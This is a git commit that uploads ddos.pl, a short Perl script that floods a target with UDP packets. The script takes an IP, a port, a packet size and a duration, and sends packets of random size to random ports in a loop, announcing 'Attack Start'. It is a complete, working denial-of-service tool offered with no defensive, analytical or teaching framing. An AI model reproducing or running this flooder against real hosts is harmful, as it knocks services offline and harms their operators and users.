73676297b9d3ef02e8b902a8a1fcd29793d1a422
NekSkCh <46574401+sarawut124@users.noreply.github.com>
2019-04-01 22:58:31 -0500

    Add files via upload

---
+++ ddos.pl
@@ -0,0 +1,18 @@
+use Socket;
+use strict;
+if ($#ARGV != 3) {
+ print "\n DDOS  \nUsage: $0 <IP> <PORT> <0> <TIME>\n\n";
+  exit(1);
+}
+my ($ip,$port,$size,$time) = @ARGV;
+my ($iaddr,$endtime,$psize,$pport);
+$iaddr = inet_aton("$ip") or die "Impossible $ip\n";
+$endtime = time() + ($time ? $time : 999);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+print  "Attack Start\n";
+print "Attaque Ctrl + C\n" unless $time;
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(763-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
+}
